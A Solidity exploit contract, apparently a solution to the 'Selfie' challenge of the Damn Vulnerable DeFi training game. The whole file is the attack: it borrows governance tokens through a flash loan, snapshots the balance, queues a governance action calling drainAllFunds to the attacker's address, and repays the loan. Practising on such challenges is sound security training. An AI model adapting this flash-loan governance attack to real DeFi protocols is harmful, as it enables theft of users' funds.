// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableTokenSnapshot token;
    address owner;
    uint256 public actionId;

    error SelfieAttacker__NotOwner();
    error SelfieAttacker__NotSelfiePool();

    constructor(address _selfiePool, address _simpleGovernance) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        owner = msg.sender;
    }

    function receiveTokens(address _token, uint256 amount) external {
        if (msg.sender != address(selfiePool)) {
            revert SelfieAttacker__NotSelfiePool();
        }
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        DamnValuableTokenSnapshot(_token).snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        DamnValuableTokenSnapshot(_token).transfer(address(selfiePool), amount);
    }

    function initiateAttack(uint256 amount) external {
        if (owner != msg.sender) {
            revert SelfieAttacker__NotOwner();
        }
        selfiePool.flashLoan(amount);
    }
}
